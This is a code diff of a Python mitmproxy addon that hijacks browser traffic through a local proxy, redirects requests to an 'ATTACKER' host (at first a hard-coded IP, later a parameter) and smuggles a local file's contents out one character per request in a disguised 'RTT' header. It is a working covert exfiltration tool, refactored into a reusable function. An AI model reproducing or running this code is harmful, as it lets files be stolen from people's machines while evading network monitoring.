@@ -2,15 +2,16 @@
 from mitmproxy.options import Options
 from mitmproxy.tools.dump import DumpMaster
 from mitmproxy import http
-from mitmproxy import ctx
 import proxybrowser as browser
 from random import randint      
 
 class AddInjection(object):
     """MiTMProxy addon that injects a message into the header of a response packet."""
-    def __init__(self,p,m):
+    def __init__(self,p,m,ip,port):
         # covert message
         self.message = m
+        self.ip = ip
+        self.port = port
         # index
         self.index = 0
         self.proxy = p
@@ -27,8 +28,8 @@ class AddInjection(object):
             flow.intercept()
 
             # modify destination
-            flow.request.host = ATTACKER
-            flow.request.port = ATTACKER_PORT
+            flow.request.host = self.ip
+            flow.request.port = self.port
             
             try:
                 flow.request.headers["RTT"] = str(self.message[self.index])
@@ -47,23 +48,20 @@ class AddInjection(object):
 # configure proxy settings
 def config_proxy()->DumpMaster:
     """Configures mitmproxy on specific port and address."""
-    opts = Options(listen_host=TARGET,listen_port=TARGET_PORT,block_global=False) 
+    opts = Options(listen_host='127.0.0.1',listen_port=8080) 
     server = DumpMaster(opts)
     return server
 
-ATTACKER = "138.47.142.77" #comes from console
-ATTACKER_PORT = 8080
 
-# windows machine
-# proxy/target
-TARGET = '127.0.0.1' #ip address of proxy
-TARGET_PORT = 8081
 
-if __name__ == """__main__""":
+def piggybackStorage(ip:str,port:int,fp:str)->None:
+    ATTACKER = ip #comes from console
+    ATTACKER_PORT = port
+
     input = []
     
     #get file
-    with open('input.txt','r',encoding='utf-8-sig') as f:
+    with open(fp,'r',encoding='utf-8-sig') as f:
         for line in f:
             for c in line:
                 input.append(ord(c))
@@ -71,7 +69,7 @@ if __name__ == """__main__""":
     
     # configurations
     prox = config_proxy()
-    prox.addons.add(AddInjection(prox,input))
+    prox.addons.add(AddInjection(prox,input,ATTACKER,ATTACKER_PORT))
     browser.set()
     # start proxying!
     print("[!] Starting Proxy")
